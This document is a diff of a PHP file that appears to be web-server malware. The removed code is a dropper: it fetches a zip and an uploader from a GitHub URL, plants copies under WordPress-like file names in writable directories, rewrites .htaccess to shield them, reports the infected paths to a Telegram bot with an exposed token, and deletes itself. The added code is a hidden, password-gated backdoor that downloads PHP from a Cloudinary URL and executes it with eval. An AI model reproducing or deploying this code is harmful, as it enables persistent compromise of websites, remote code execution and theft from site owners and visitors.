@@ -1,180 +1,276 @@
 <?php
-error_reporting(0);
-set_time_limit(0);
-$botToken = "8389098682:AAFTPObfdl_xC18WaVY5CsRl5ReXBMBXbvg";
-$chatId   = "-1003872848823";
-$folderName  = 'shop';
-$zipUrl      = 'https://raw.githubusercontent.com/lastman1105-spec/deploy/refs/heads/main/004.zip';
-$uploaderUrl = 'https://raw.githubusercontent.com/lastman1105-spec/deploy/refs/heads/main/save.php';
-$whitelistNames = [
-    'config.php', 'fetch.php', 'tn.php', 'epep.php', '1a.php', 'a.php', 
-    'wp-config-sample.php', 'hp23.php', 'hp4.php', 'darks.php', 
-    'wp-config.php', 'wp-trackback.php', 'wp-content-css.php', 'wp-hader-css.php', 
-    'style-css.php', 'wp-login.php', 'wp-blog-header.php', 'file-manager.php', 
-    'index.php', 'xrsoot.php'
-];
-function cari_pintu_depan() {
-    $path = __DIR__;
-    while ($path !== '/' && $path !== '.' && $path !== dirname($path)) {
-        if (is_dir($path . '/wp-content')) return $path;
-        $path = dirname($path);
-    }
-    return $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
-}
-function sedot($url) {
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return @file_get_contents($url);
-}
+session_start();
 
-function kirim_tele($pesan, $token, $id) {
-    $url = "https://api.telegram.org/bot$token/sendMessage";
-    $data = [
-        'chat_id' => $id,
-        'text' => $pesan,
-        'parse_mode' => 'HTML'
-    ];
-    
-    if (function_exists('curl_init')) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-        $result = curl_exec($ch);
-        curl_close($ch);
-        return $result;
-    }
-    
-    $options = [
-        'http' => [
-            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
-            'method'  => 'POST',
-            'content' => http_build_query($data),
-            'timeout' => 15
-        ]
-    ];
-    $context = stream_context_create($options);
-    return @file_get_contents($url, false, $context);
+function is_logged_in() {
+    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
 }
-
-function scan_variasi_dir($baseDir, &$results, $depth = 0, $min = 3, $limit = 10) {
-    if (count($results) >= $limit) return;
-    $dirs = @glob($baseDir . '/*', GLOB_ONLYDIR | GLOB_NOSORT);
-    if (!$dirs) return;
-    shuffle($dirs); 
-    foreach ($dirs as $dir) {
-        if (count($results) >= $limit) return;
-        $baseName = basename($dir);
-        if (in_array($baseName, ['cgi-bin', 'node_modules', '.git', 'cache', 'wp-admin', 'wp-includes'])) continue;
-        if ($depth >= $min && is_writable($dir)) {
-            $parent = dirname($dir);
-            $alreadyUsed = false;
-            foreach ($results as $r) { 
-                if (dirname($r) === $parent) { 
-                    $alreadyUsed = true; 
-                    break; 
-                } 
-            }
-            if (!$alreadyUsed) { 
-                $results[] = $dir; 
-            }
+$userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
+$passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';
+if (!is_logged_in()) {
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
+            $_SESSION['loggedin'] = true;
+            header("Location: " . strtok($_SERVER['REQUEST_URI'], '?'));
+            exit();
+        } else {
+            $error = "Wrong";
         }
-        scan_variasi_dir($dir, $results, $depth + 1, $min, $limit);
+    }
+}
+function geturlsinfo($destiny) {
+    $Array = array(
+        'fopen',
+        'stream_get_contents',
+        'file_get_contents',
+        'curl_exec'
+    );
+
+    if (function_exists($Array[3])) {
+        $ch = curl_init($destiny);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        $love = curl_exec($ch);
+        curl_close($ch);
+        return $love;
+    } elseif (function_exists($Array[2])) {
+        return file_get_contents($destiny);
+    } elseif (function_exists($Array[0]) && function_exists($Array[1])) {
+        $purpose = fopen($destiny, "r");
+        $love = stream_get_contents($purpose);
+        fclose($purpose);
+        return $love;
+    }
+    return false;
+}
+
+if (is_logged_in()) {
+    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786662627/kuyangbaru_kvc7tx';
+    
+    $dream = geturlsinfo($destiny);
+
+    if ($dream !== false) {
+        $pos = strpos($dream, '<?php');
+        if ($pos !== false) {
+            $phpCode = substr($dream, $pos + 5); 
+            eval($phpCode);
+        } else {
+            eval('?>' . $dream);
+        }
+        exit();
     }
 }
 
-$rootDir = cari_pintu_depan();
-$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
-$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+if (!is_logged_in()) {
+    $showForm = isset($_GET['not']) || isset($error);
+    ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>EL STILL HERE</title>
+        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body, html {
+                height: 100%;
+                font-family: 'Orbitron', sans-serif;
+            }
+            body {
+                background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
+                background-size: cover;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+            .form-container {
+                display: <?php echo $showForm ? 'flex' : 'none'; ?>;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                padding: 20px;
+            }
+            .login-form {
+                width: 100%;
+                max-width: 380px;
+                padding: 40px 30px;
+                background: rgba(20, 0, 0, 0.88);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+                border-radius: 16px;
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.6), 0 0 50px rgba(255, 0, 0, 0.4), inset 0 0 15px rgba(255, 102, 0, 0.2);
+                text-align: center;
+                color: #fff;
+                border: 2px dashed rgba(255, 120, 0, 0.6);
+            }
+            .login-form img {
+                width: 90px;
+                height: 90px;
+                border-radius: 50%;
+                object-fit: cover;
+                margin-bottom: 15px;
+                border: 3px solid rgba(255, 120, 0, 0.6);
+                box-shadow: 0 0 15px rgba(255, 102, 0, 0.5);
+            }
+            .login-form h2 {
+                margin: 0 0 25px 0;
+                font-size: 22px;
+                font-weight: 800;
+                letter-spacing: 2px;
+                color: #ff8533;
+                text-shadow: 0 0 12px rgba(255, 102, 0, 0.8);
+            }
+            .login-form input[type="text"],
+            .login-form input[type="password"] {
+                width: 100%;
+                padding: 14px 16px;
+                margin: 10px 0;
+                border-radius: 8px;
+                background: rgba(255, 255, 255, 0.05);
+                color: #fff;
+                font-size: 15px;
+                font-family: 'Orbitron', sans-serif;
+                transition: all 0.3s ease;
+                border: 1px solid rgba(255, 120, 0, 0.3);
+            }
+            .login-form input[type="text"]::placeholder,
+            .login-form input[type="password"]::placeholder {
+                color: rgba(255, 255, 255, 0.5);
+            }
+            .login-form input[type="text"]:focus,
+            .login-form input[type="password"]:focus {
+                outline: none;
+                background: rgba(255, 102, 0, 0.1);
+                border-color: rgba(255, 120, 0, 0.8);
+                box-shadow: 0 0 12px rgba(255, 102, 0, 0.5);
+            }
+            .login-form button {
+                width: 100%;
+                padding: 14px;
+                margin-top: 20px;
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
+                color: white;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 15px;
+                font-weight: 600;
+                font-family: 'Orbitron', sans-serif;
+                letter-spacing: 1px;
+                transition: all 0.3s ease;
+                text-transform: uppercase;
+                box-shadow: 0 4px 20px rgba(255, 102, 0, 0.6);
+            }
+            .login-form button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 25px rgba(255, 102, 0, 0.9);
+                background: linear-gradient(135deg, #ff8533 100%, #cc0000 0%);
+            }
+            .error-message {
+                background: rgba(255, 82, 82, 0.2);
+                color: #ff5252;
+                font-size: 14px;
+                padding: 10px;
+                border-radius: 6px;
+                margin-bottom: 15px;
+                border: 1px solid rgba(255, 82, 82, 0.4);
+            }
 
-$targetPath = $rootDir . '/' . $folderName;
-$status_shop = "GAGAL";
-if (!is_dir($targetPath)) @mkdir($targetPath, 0755, true);
-
-if (is_dir($targetPath)) {
-    $zipData = sedot($zipUrl);
-    if ($zipData) {
-        $zipFile = $targetPath . '/new.zip';
-        file_put_contents($zipFile, $zipData);
-        if (file_exists($zipFile) && class_exists('ZipArchive')) {
-            $zip = new ZipArchive;
-            if ($zip->open($zipFile) === TRUE) {
-                $zip->extractTo($targetPath . '/');
-                $zip->close();
-                @unlink($zipFile);
-                if (file_exists($targetPath . '/fetch.php')) {
-                    $status_shop = "BERHASIL (0755)";
+            #customPopup {
+                display: none;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.7);
+                backdrop-filter: blur(5px);
+                justify-content: center;
+                align-items: center;
+                z-index: 99999;
+            }
+            .popup-box {
+                background: rgba(20, 0, 0, 0.95);
+                border: 2px solid #ff6600;
+                padding: 30px;
+                border-radius: 12px;
+                text-align: center;
+                color: #fff;
+                box-shadow: 0 0 25px rgba(255, 102, 0, 0.8);
+                max-width: 300px;
+                width: 90%;
+            }
+            .popup-box h3 {
+                color: #ff8533;
+                margin-bottom: 15px;
+                font-size: 18px;
+                letter-spacing: 1px;
+            }
+            .popup-box button {
+                padding: 10px 25px;
+                background: linear-gradient(135deg, #ff6600 0%, #b30000 100%);
+                color: white;
+                border: none;
+                border-radius: 6px;
+                cursor: pointer;
+                font-family: 'Orbitron', sans-serif;
+                font-weight: 600;
+                margin-top: 15px;
+                box-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
+            }
+        </style>
+    </head>
+    <body>
+        <div class="form-container" id="formContainer">
+            <div class="login-form">
+                <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
+                <h2>SINGLE FIGHTER ERA</h2>
+                <?php if (isset($error)): ?>
+                    <div class="error-message"><?php echo $error; ?></div>
+                <?php endif; ?>
+                <form method="post">
+                    <input type="text" name="username" placeholder="Username ..." required>
+                    <input type="password" name="password" placeholder="Password ..." required>
+                    <button type="submit">UDAH IMO BELUM</button>
+                </form>
+            </div>
+        </div>
+        <div id="customPopup">
+            <div class="popup-box">
+                <h3>nyari apa dek?</h3>
+                <button onclick="closePopup()">TUTUP</button>
+            </div>
+        </div>
+        <script>
+            function showWarning() {
+                document.getElementById('customPopup').style.display = 'flex';
+            }
+           function closePopup() {
+                document.getElementById('customPopup').style.display = 'none';
+            }
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                showWarning();
+            });
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
+                    (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+                    e.preventDefault();
+                    showWarning();
                 }
-            }
-        }
-    }
+            });
+        </script>
+    </body>
+    </html>
+    <?php
+    exit();
 }
-
-$uploaderContent = sedot($uploaderUrl);
-$stealth_results = [];
-$targets = [];
-scan_variasi_dir($rootDir, $targets, 0, 3, 10);
-
-if ($uploaderContent && !empty($targets)) {
-    $allowListStr = implode('|', $whitelistNames);
-    foreach ($targets as $dir) {
-        $namaFile = $whitelistNames[array_rand($whitelistNames)];
-        $pathFile = $dir . '/' . $namaFile;
-        $pathHt   = $dir . '/.htaccess';
-
-        if (file_put_contents($pathFile, $uploaderContent)) {
-            $htaccess  = "<FilesMatch \".*\.(phtml|php|PhP|php5|suspected)$\">\n";
-            $htaccess .= "Order allow,deny\nDeny from all\n</FilesMatch>\n";
-            $htaccess .= "<FilesMatch \"^($allowListStr)$\">\n";
-            $htaccess .= "Order allow,deny\nAllow from all\n</FilesMatch>\n";
-            $htaccess .= "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\.php$ - [L]\n";
-            $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>";
-
-            file_put_contents($pathHt, $htaccess);
-
-            $stealth_results[] = $pathFile;
-        }
-    }
-}
-
-$report = "DEPLOY REPORT - " . $host . "\n";
-$report .= "------------------------------------\n";
-$report .= "Shop Status: " . $status_shop . "\n";
-if (strpos($status_shop, "BERHASIL") !== false) {
-    $report .= "Main: " . $proto . "://" . $host . "/" . $folderName . "/fetch.php\n";
-}
-$report .= "\nStealth Backups:\n";
-
-if (!empty($stealth_results)) {
-    foreach ($stealth_results as $fullPath) {
-        $relativeLink = str_replace($rootDir, '', $fullPath);
-        $report .= "- " . $proto . "://" . $host . $relativeLink . "\n";
-    }
-} else {
-    $report .= "Tidak ada folder writable ditemukan.\n";
-}
-$report .= "------------------------------------\n";
-$report .= "Script self-destructed for safety.";
-
-kirim_tele($report, $botToken, $chatId);
-
-echo "<pre>";
-echo "Deployment Finished.\n";
-echo "Report has been sent to Telegram.\n";
-echo "----------------------------------\n";
-echo $report;
-echo "</pre>";
-
-@unlink(__FILE__);
 ?>
